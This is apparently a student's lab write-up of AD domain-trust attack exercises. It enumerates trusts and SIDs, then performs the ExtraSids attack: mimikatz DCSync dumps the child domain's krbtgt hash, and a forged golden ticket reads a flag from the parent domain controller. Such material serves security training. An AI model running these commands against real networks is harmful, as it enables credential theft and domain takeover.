Q1: What is the child domain of INLANEFREIGHT.LOCAL? (format: FQDN, i.e., DEV.ACME.LOCAL)

Import-Module ActiveDirectory
Get-ADTrust -Filter *

<img width="1097" height="560" alt="image" src="https://github.com/user-attachments/assets/12ac34fb-d8fa-40ef-86e6-3504f3982e7c" />


Q2: What domain does the INLANEFREIGHT.LOCAL domain have a forest transitive trust with?

Ans > FREIGHTLOGISTICS.LOCAL

---

# Attacking Domain Trusts - Child -> Parent Trusts - from Windows

Q1: What is the SID of the child domain?

Import-Module .\PowerView.ps1
Get-DomainSID

---

Q2: What is the SID of the Enterprise Admins group in the root domain?

Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

---
Q3: Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\ExtraSids folder on the ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL domain controller in the parent domain.

.\mimikatz.exe
mimikatz> privilege::debug
mimikatz> lsadump::dcsync /user:LOGISTICS\krbtgt

## We now have the krbtgt hash, the SID of the Enterprise Admins group, and the SID of the child domain, which enables us to create a Golden Ticket.

kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

## exit and use klist.exe to check

C:> .\klist.exe

### Get the flag

cat \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
